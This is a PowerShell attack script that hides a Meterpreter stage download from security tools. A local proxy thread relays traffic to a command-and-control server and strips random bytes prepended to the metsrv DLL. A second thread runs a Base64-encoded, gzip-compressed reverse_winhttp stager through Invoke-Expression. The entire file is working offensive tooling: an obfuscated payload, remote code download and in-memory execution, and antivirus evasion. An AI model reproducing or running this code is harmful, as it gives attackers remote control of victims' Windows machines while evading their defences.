<#
.SYNOPSIS

Client side script for a meterpreter stage download obfuscation technique for a reverse_winhttp payload.
Beware it does *NOT* work with the reverse_winhttpS payload. 

Author: Arno0x0x (https://twitter.com/Arno0x0x)
License: GPL3
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This script starts and runs two complementary threads:

- Thread 1:
	Starts an HTTP proxy which only purpose is to deobfuscate the meterpreter stage DLL received before handing it over
	to the meterpreter stager running in thread 2. This proxy handles connection and authentication to the default
	upstream system proxy and relays every HTTP request (GET and POST only) to the actual metasploit multi/handler.
	
	The stage DLL obfuscation technique is *very* basic (but it works !):
	
	Before the metasploit framework sends the meterpreter stage DLL, a fixed number of random bytes
	are prepended to the DLL (this is done in /usr/share/metasploit-framework/lib/msf/core/payload/windows/meterpreter_loader.rb):
	
	+----------+----------+				+----------+----------+----------+----------+
	+     METSRV.DLL      +		==>		+ 64K OF RANDOM BYTES +     METSRV.DLL      +
	+----------+----------+				+----------+----------+----------+----------+
	
	So what the proxy does is removing those first 64K (65536 bytes precisely) on the fly hence restoring the original
	meterpreter stage DLL before handing it over to the meterpreter stager.
	
- Thread 2:
	Runs a generic meterpreter reverse_winhttp stager with its LHOST=127.0.0.1 and LPORT=8080 to match 
	the local proxy listening socket created in thread 1.

.EXAMPLE

Depending on the meterpreter stager architecture defined in thread 2, run this script accordingly:

x86 architecture:
	C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe .\proxyMeterpreterHideout.ps1
	
x64 architecture:
	powershell .\proxyMeterpreterHideout.ps1
#>

#================== Thread 1 code: the local proxy ==================
$Proxy = {
	# Detect and set automatic proxy and network credentials
	$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
	$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

	$proxyServer = New-Object System.Net.HttpListener
	$proxyServer.Prefixes.Add('http://127.0.0.1:8080/')

	$proxyServer.Start()

	# The first request made is for the metsrv.dll stage, we need to identify it
	$metsrvRequest = $true

	$clientBuffer = new-object System.Byte[] 1024
	$serverBuffer = new-object System.Byte[] 65536
	
	# Server request as long as 
	while ($proxyServer.IsListening) {
		$context = $proxyServer.GetContext() # blocks until request is received
		$clientRequest = $context.Request
		$proxyResponse = $context.Response
		
		$headers = $clientRequest.Headers
		$headers.Remove("Proxy-Connection")
		$headers.Remove("Host")
		$method = $clientRequest.HttpMethod
		$pathAndQuery = $clientRequest.Url.PathAndQuery
		
		#===> SET HERE YOUR ACTUAL METASPLOIT MULTI/HANDLER SERVER HOST & PORT <===
		$destUrl = "http://mycncserver.example.com" + $pathAndQuery
		
		#--------------------------------------
		# Create a proxy request
		$proxyRequest = [System.Net.HttpWebRequest]::Create($destUrl)
		$proxyRequest.Headers = $headers
		$proxyRequest.Method = $method
		$proxyRequest.Proxy = $proxy
			
		#--------------------------------------
		# Case of a POST request with body data
		if ($clientRequest.HasEntityBody) {
			$clientRequestStream = $clientRequest.InputStream
			$proxyRequestStream = $proxyRequest.GetRequestStream()
			
			do {
				$bytesReceived = $clientRequestStream.Read($clientBuffer, 0, $clientBuffer.length)
				$proxyRequestStream.Write($clientBuffer, 0 , $bytesReceived)
			} while ($clientRequestStream.DataAvailable)
			
			$proxyRequestStream.Flush()
		}
		
		# Send the request to the origin server (through the upstream proxy) and wait for the response
		$serverResponse = $proxyRequest.GetResponse()
		$responseStream = $serverResponse.GetResponseStream()
		$proxyResponseStream = $proxyResponse.OutputStream

		#---------------------------------------------------------------------------------------------
		# Check if that was the first request from the meterpreter stager, ie the one used to download
		# the initial metsrv.dll stage
		if ($metsrvRequest) {
			# Consume 65536 bytes to remove random data that was prepended to the metsrv stager
			$offset = 0;
			while ($offset -lt 65536)
			{	
				$bytesReceived = $responseStream.Read($serverBuffer, $offset, 65536 - $offset)
				$offset += $bytesReceived
			}
			$metsrvRequest = $false
		}
		
		#--------------------------------------
		# Transmit received bytes to the client
		do {
			$bytesReceived = $responseStream.Read($serverBuffer, 0, $serverBuffer.length)
			$proxyResponseStream.Write($serverBuffer, 0 , $bytesReceived)
			$proxyResponseStream.Flush()
		} while ($bytesReceived -gt 0)
		
		$proxyResponseStream.Close()
	}

	$proxyServer.Stop()
}

#================== Thread 2 code: the meterpreter stager ==================
$MeterpreterStager = {
	# This is a x86 meterpreter reverse_winhttp payload that connects back to the localhost on port 8080, which is how the above local proxy instance is configured for
	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
	$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('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'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
}

#================= Launch both threads =================
$proxyThread = [PowerShell]::Create()
$proxyThread.AddScript($Proxy)
$meterpreterThread = [PowerShell]::Create()
$meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
        $proxyThread.EndInvoke($AsyncProxyJobResult)
        $proxyThread.Dispose()
    }
	
	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
        $meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
        $meterpreterThread.Dispose()
    }
}
